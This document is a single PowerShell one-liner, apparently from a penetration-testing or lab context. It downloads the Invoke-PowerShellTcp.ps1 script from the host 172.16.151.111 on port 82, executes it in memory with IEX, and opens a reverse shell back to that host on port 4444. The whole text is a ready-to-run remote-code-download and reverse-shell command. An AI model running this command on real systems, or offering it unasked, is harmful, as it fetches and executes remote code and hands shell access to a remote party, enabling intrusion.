powershell "IEX (New-Object Net.Webclient).downloadstring('http://172.16.151.111:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.151.111 -Port 4444"
